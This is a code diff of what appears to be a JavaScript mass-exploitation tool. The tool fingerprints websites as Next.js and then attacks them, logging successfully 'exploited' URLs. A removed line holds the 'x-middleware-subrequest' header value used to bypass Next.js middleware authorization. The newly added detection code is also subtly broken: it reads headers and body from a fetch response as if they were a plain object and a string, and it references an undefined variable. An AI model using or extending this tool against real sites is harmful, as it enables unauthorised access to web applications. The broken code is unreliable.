@@ -62,9 +62,18 @@ const log = (message, colorCode='\x1b[0m') => {
 
 async function checkFrameWork(url){
   try {
-    let response = await fetch(url);
-    let poweredBy = response?.headers?.get("x-powered-by")?.toLowerCase();
-    if (poweredBy == 'next.js'){
+    let { headers, body } = await fetch(url);
+    const isNextHeader = headers['x-powered-by'] === 'Next.js';
+    const hasNextData = body.includes('__NEXT_DATA__');
+    const matchesNextPaths = body.match(/\/_next\/[^"'\s]+/g) || [];
+    const preloadsNext = linkHeader.includes('/_next/');
+    const isLikelyNext =
+      isNextHeader ||
+      hasNextData ||
+      matchesNextPaths.length > 0 ||
+      preloadsNext;
+
+    if (isLikelyNext){
       log(`${url} is using Next.js`);
       return true
     }else {
@@ -139,7 +148,7 @@ async function attack(ws, headers){
         exploitedSites.push(exploitUrl);
         info[hostname].result = 'Exploited';
         info[hostname].exploitedUrls.push(exploitUrl)
-        info[hostname].headers = `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`
+        info[hostname].headers = headers;
       }
     } catch (e) {
       info[hostname].errors.push({message: e.message, code: e.code, info: `Error attacking`})
